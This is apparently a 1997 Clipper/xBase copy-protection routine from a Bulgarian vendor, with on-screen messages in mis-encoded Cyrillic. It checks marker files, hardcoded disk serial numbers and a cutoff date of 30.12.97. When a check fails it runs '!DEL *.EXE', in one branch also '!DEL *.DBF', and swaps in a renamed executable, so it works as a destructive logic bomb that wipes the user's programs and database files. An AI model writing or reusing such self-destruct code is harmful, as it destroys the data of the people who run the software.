*************************************************************************
*                     DMD Computer.com (c)1997, DPP                     *
*************************************************************************

********************************* START *********************************

CLEAR
CLOSE ALL
D1 := '2C33-1305'
D2 := '1EA6-2765'
D3 := '3134-1EE1'


********************************* FILE

LP := 0

FLE = 'KA'
FLE = FLE + 'RT6.JTX'

IF !FILE(FLE)
        LP = 1
ENDIF

FLE = 'KAR'
FLE = FLE + 'T5.JTX'

IF !FILE(FLE)
        LP = 1
ENDIF

IF (LP=1)
        SET CURSOR OFF
        SET COLOR TO W+*/B
        @ 2, 0 SAY '      Си▒▓ема▓а не е кон┤иг│░и░ана п░авилно - ИЗТРИТИ СА ВАЖНИ ФАЙЛОВЕ !!!      '
        SET COLOR TO
        @ 3, 0 SAY '      Обаде▓е ▒е на -DMD Computer.com- , г░. Нова Заго░а, ▓ел: 0457-23263       '
        SET COLOR TO
        !DEL *.EXE
        IF FILE(FLE)
                FRENAME('KART5.JTX', 'COOP.EXE')
        ENDIF
        QUIT
ENDIF

*********************************************** HACKERS

NN := '2C3'
NN := NN + '3-13'
NN := NN + '05'

MM := '1'
MM := MM + 'EA6-'
MM := MM + '27'
MM := MM + '65'

IF D1<>NN .OR. D2<>MM
        !DEL *.EXE
        SET CURSOR OFF
        SET COLOR TO W+*/B
        @ 2, 0 SAY '      Си▒▓ема▓а о▓к░ива нео▓о░изи░ана наме▒а в не┐ - САМОУНИЩОЖАВА СЕ !!!       '
        SET COLOR TO
        @ 3, 0 SAY '      Обаде▓е ▒е на -DMD Computer.com- , г░. Нова Заго░а, ▓ел: 0457-23263       '
        SET COLOR TO
        FRENAME('KART6.JTX', 'COOP.EXE')
        !DEL *.DBF
        QUIT
ENDIF

*********************************************** NOMER

!DIR > DIR.TXT
AA  := MEMOREAD("DIR.TXT")
AA1 := MEMOLINE(AA,41,3)
AA2  = SUBSTR(AA1,26,9)
FCREATE('DIR.TXT')
FERASE('DIR.TXT')

DA1 := '2C3'
DA1 := DA1 + '3-13'
DA1 := DA1 + '05'

DA2 := '1'
DA2 := DA2 + 'EA6-'
DA2 := DA2 + '27'
DA2 := DA2 + '65'

IF (AA2=DA1 .OR. AA2=DA2)
        @ 22, 8 SAY ' ПОЖЕЛАВАМЕ ВИ ПРИЯТНА РАБОТА !!! '
ELSE
        SET CURSOR OFF
        SET COLOR TO W+*/B
        @ 2, 0 SAY '    Вие не може▓е да ░або▓и▓е ▒ ▓ози п░од│к▓ - НЕ Е ПРЕДНАЗНАЧЕН ЗА ВАС !!!     '
        SET COLOR TO
        @ 3, 0 SAY '      Обаде▓е ▒е на -DMD Computer.com- , г░. Нова Заго░а, ▓ел: 0457-23263       '
        SET COLOR TO
        !DEL *.EXE
        FRENAME('KART5.JTX', 'COOP.EXE')
        QUIT
ENDIF

******************************************* DATE

SET DATE GERMAN
DAT1 := DATE()
DAT2 := '30.1'
DAT2 := DAT2 + '2.97'
DAT3 := CTOD(DAT2)

IF (DAT1>=DAT3)
        SET CURSOR OFF
        SET COLOR TO W+*/B
        @ 2, 0 SAY '    Вие не може▓е да ░або▓и▓е ▒ ▓ози п░од│к▓ - НЕ Е ПРЕДНАЗНАЧЕН ЗА ВАС !!!     '
        SET COLOR TO
        @ 3, 0 SAY '      Обаде▓е ▒е на -DMD Computer.com- , г░. Нова Заго░а, ▓ел: 0457-23263       '
        SET COLOR TO
        !DEL *.EXE
        FRENAME('KART5.JTX', 'COOP.EXE')
        QUIT
ENDIF

RETURN
****************************************  END
